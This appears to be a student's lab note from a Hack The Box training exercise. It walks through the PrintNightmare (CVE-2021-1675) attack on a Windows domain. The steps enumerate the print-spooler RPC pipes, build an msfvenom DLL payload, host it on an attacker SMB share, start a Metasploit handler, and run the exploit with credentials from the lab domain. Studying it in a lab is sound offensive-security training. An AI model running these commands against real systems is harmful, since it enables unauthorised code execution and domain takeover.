cOnce you have gained a foothold on a victim Windows Machine, you can possibly try this technique

- First, run rpcdump.py
	- sudo rpcdump.py @IPaddr | egrep 'MS-RPRN|MS-PAR'
	- make sure to install cube0x0's impacket version
	- Create an MSF Venom DLL payload
- Second, run smbserver.py
	- From where your payload sits, run:
		- sudo smbserver.py -smb2support Comp /home/htb-student/
- Third, start a multi/handler
	- Use multi/exploit/handler 
- Fourth, run the CVE-2021-1675.py
	- From Victim, run sudo python3 CVE-2021-1675.py inlanefreight.local/forend:Klmcargo2@172.16.5.5 (Domain IPaddr) '\\172.16.5.225\Comp\msfvenom.dll'